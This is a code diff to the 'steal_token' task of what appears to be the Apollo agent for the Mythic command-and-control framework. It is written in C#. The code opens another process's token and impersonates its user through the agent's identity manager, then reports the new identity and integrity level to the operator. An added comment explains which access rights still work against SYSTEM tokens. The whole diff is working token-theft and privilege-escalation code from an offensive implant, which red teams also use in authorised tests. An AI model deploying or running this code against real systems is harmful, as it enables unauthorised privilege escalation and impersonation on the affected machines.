@@ -22,129 +22,95 @@ namespace Tasks
             IntPtr hProcessHandle,
             TokenAccessLevels dwDesiredAccess,
             out IntPtr hTokenHandle);
-        private delegate bool DuplicateTokenEx(
-            IntPtr hExistingToken,
-            TokenAccessLevels dwDesiredAccess,
-            IntPtr lpTokenAttributes,
-            TokenImpersonationLevel dwImpersonationLevel,
-            int dwTokenType,
-            out IntPtr phNewToken);
-        private delegate void CloseHandle(IntPtr hHandle);
+        private delegate bool CloseHandle(IntPtr hHandle);
 
         private OpenProcessToken _pOpenProcessToken;
-        private DuplicateTokenEx _pDuplicateTokenEx;
         private CloseHandle _pCloseHandle;
 
         public steal_token(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _pOpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
-            _pDuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
             _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
         }
 
-
         public override void Start()
         {
-            string errorMessage = "";
-            MythicTaskResponse resp = new MythicTaskResponse { };
-            IntPtr procHandle = IntPtr.Zero;
-            IntPtr hImpersonationToken = IntPtr.Zero;
-            IntPtr hProcessToken = IntPtr.Zero;
+            _agent.GetTaskManager().AddTaskResponseToQueue(StealToken());
+        }
+
+        private MythicTaskResponse StealToken()
+        {
+            int pid;
+            IntPtr hProcess;
             try
             {
-                procHandle = System.Diagnostics.Process.GetProcessById((int) Convert.ToInt32(_data.Parameters)).Handle;
+                pid = int.Parse(_data.Parameters);
+                hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
             }
             catch (Exception ex)
             {
-                errorMessage = $"Failed to acquire process handle to {_data.Parameters}: {ex.Message}";
+                return CreateTaskResponse($"Failed to acquire process handle to {_data.Parameters}: {ex.Message}", true, "error");
             }
 
-            if (procHandle != IntPtr.Zero)
-            {
-                _agent.GetTaskManager().AddTaskResponseToQueue(
-                    CreateTaskResponse("", false, "", new IMythicMessage[]
-                    {
-                        Artifact.ProcessOpen(int.Parse(_data.Parameters))
-                    }));
-                bool bRet = _pOpenProcessToken(
-                    procHandle,
-                    TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query,
-                    out hProcessToken);
-                if (!bRet)
+            _agent.GetTaskManager().AddTaskResponseToQueue(
+                CreateTaskResponse("", false, "", new IMythicMessage[]
                 {
-                    errorMessage = $"Failed to open process token: {Marshal.GetLastWin32Error()}";
-                }
-                else
+                    Artifact.ProcessOpen(pid)
+                }));
+
+            // TOKEN_DUPLICATE | TOKEN_QUERY is all the identity manager needs to make its own copies,
+            // which get full access. SeDebugPrivilege does not bypass the token's own DACL, so asking
+            // for more here (e.g. TOKEN_ADJUST_*) fails on many SYSTEM and other users' tokens.
+            if (!_pOpenProcessToken(hProcess, TokenAccessLevels.Duplicate | TokenAccessLevels.Query, out IntPtr hProcessToken))
+            {
+                return CreateTaskResponse($"Failed to open process token: {Marshal.GetLastWin32Error()}", true, "error");
+            }
+
+            var identityManager = _agent.GetIdentityManager();
+            var old = identityManager.GetCurrentImpersonationIdentity();
+            var oldIntegrity = identityManager.GetIntegrityLevel();
+
+            bool bRet = identityManager.SetIdentity(hProcessToken);
+            int dwError = Marshal.GetLastWin32Error();
+            _pCloseHandle(hProcessToken);
+
+            if (!bRet)
+            {
+                return CreateTaskResponse($"Failed to duplicate token: {dwError}", true, "error");
+            }
+
+            var cur = identityManager.GetCurrentImpersonationIdentity();
+            var newIntegrity = identityManager.GetIntegrityLevel();
+            var integrityMessage = newIntegrity != oldIntegrity ? $" ( {newIntegrity} )" : "";
+
+            return CreateTaskResponse(
+                $"Successfully set Impersonation Identity to {cur.Name}\n{FormatClaims("Old", old, oldIntegrity)}\n{FormatClaims("New", cur, newIntegrity)}",
+                true,
+                "",
+                new IMythicMessage[]
                 {
-                    _agent.GetIdentityManager().SetPrimaryIdentity(hProcessToken);
-                    bRet = _pDuplicateTokenEx(
-                        hProcessToken,
-                        TokenAccessLevels.MaximumAllowed,
-                        IntPtr.Zero,
-                        TokenImpersonationLevel.Impersonation,
-                        1, // TokenImpersonation
-                        out hImpersonationToken);
-                    if (!bRet)
-                    {
-                        errorMessage = $"Failed to duplicate token for impersonation: {Marshal.GetLastWin32Error()}";
-                    }
-                    else
-                    {
-                        var old = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
-                        var oldIntegrity = _agent.GetIdentityManager().GetIntegrityLevel();
-                        _agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
-                        var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
-                        var newIntegrity = _agent.GetIdentityManager().GetIntegrityLevel();
-                        var stringOutput = $"Old Claims (IntegrityLevel: {oldIntegrity}, Authenticated: {old.IsAuthenticated}, ImpersonationLevel: {old.ImpersonationLevel}, AuthType: ";
-                        try
-                        {
-                            stringOutput += $"{old.AuthenticationType}):\n";
-                        }
-                        catch
-                        {
-                            stringOutput += $"AccessDenied):\n";
-                        }
-                        foreach (var item in old.Claims)
-                        {
-                            stringOutput += item.ToString() + "\n";
-                        }
-                        stringOutput += $"\nNew Claims (IntegrityLevel: {newIntegrity}, Authenticated: {cur.IsAuthenticated}, ImpersonationLevel: {cur.ImpersonationLevel}, AuthType: ";
-                        try
-                        {
-                            stringOutput += $"{cur.AuthenticationType}):\n";
-                        }
-                        catch
-                        {
-                            stringOutput += $"AccessDenied):\n";
-                        }
-                        foreach (var item in cur.Claims)
-                        {
-                            stringOutput += item.ToString() + "\n";
-                        }
-                        var integrityMessage = newIntegrity != oldIntegrity ? $" ( {newIntegrity} )" : "";
-                        resp = CreateTaskResponse($"Successfully set Impersonation Identity to {cur.Name}\n{stringOutput}", true, "", new IMythicMessage[] {
-                            new CallbackUpdate{  ImpersonationContext = $"{cur.Name}{integrityMessage}" , IntegrityLevel = ((int)newIntegrity) }
-                        });
-                    }
-                }
-            }
+                    new CallbackUpdate { ImpersonationContext = $"{cur.Name}{integrityMessage}", IntegrityLevel = (int)newIntegrity }
+                });
+        }
 
-            if (!string.IsNullOrEmpty(errorMessage))
+        private static string FormatClaims(string label, WindowsIdentity identity, IntegrityLevel integrity)
+        {
+            string authType;
+            try
             {
-                resp = CreateTaskResponse(errorMessage, true, "error");
+                authType = identity.AuthenticationType;
             }
-
-            if (hProcessToken != IntPtr.Zero)
+            catch
             {
-                _pCloseHandle(hProcessToken);
+                authType = "AccessDenied";
             }
 
-            if (hImpersonationToken != IntPtr.Zero)
+            var output = $"{label} Claims (IntegrityLevel: {integrity}, Authenticated: {identity.IsAuthenticated}, ImpersonationLevel: {identity.ImpersonationLevel}, AuthType: {authType}):\n";
+            foreach (var claim in identity.Claims)
             {
-                _pCloseHandle(hImpersonationToken);
+                output += claim + "\n";
             }
-
-            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            return output;
         }
     }
 }
